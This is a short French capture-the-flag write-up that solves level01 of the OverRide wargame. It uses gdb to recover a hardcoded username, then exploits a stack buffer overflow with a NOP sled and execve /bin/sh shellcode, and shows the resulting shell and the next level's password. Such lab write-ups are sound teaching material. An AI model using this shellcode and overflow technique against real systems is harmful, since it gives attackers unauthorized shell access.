# level01

On voit en gros un main qui va appeler `verify_user_name()` et `verify_user_pass()` pour authentifier un utilisateur

Quand on disassemble `verify_user_name()` sur gdb, on voit que cette instruction est responsable de la comparaison:

```as
   0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)```

Si on met un breakpoint et qu'on affiche la valeur de `edi`, on trouve la valeur attendue:

```sh
gdb) b *verify_user_name+39
Breakpoint 1 at 0x804848b
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: test
verifying username....


Breakpoint 1, 0x0804848b in verify_user_name ()
(gdb) x/s $edi
0x80486a8:     "dat_wil"```

Meme chose pour `verify_user_pass()`
```as
 0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi)
 ```

 ```sh
Enter Password: 
test

Breakpoint 2, 0x080484bb in verify_user_pass ()
(gdb) x/s $edi
0x80486b0:     "admin"
```

2:54 PM Loïc: 0x0804a040 adresse du premier buffer

3:03 PM Loïc: offset de 80 sur le 2eme argument   // TODO bah expliquer vu que je suis attardé et que je note pas ceque jai fait

```sh
level01@OverRide:~$ echo $(perl -e 'print "dat_wil" . "\x90"x100 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";') > /tmp/first
level01@OverRide:~$ echo $(perl -e 'print "A"x80 . "\x72\xa0\x04\x08";') > /tmp/second
```

```sh
level01@OverRide:~$ cat /tmp/second - | cat /tmp/first - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

Dans le premier buffer, j'ai mis le shellcode derrière 100 NOP, dans le 2eme, j'ai mis un padding de 80 puis une adresse a 50 d'offset de l'adresse du premier buffer
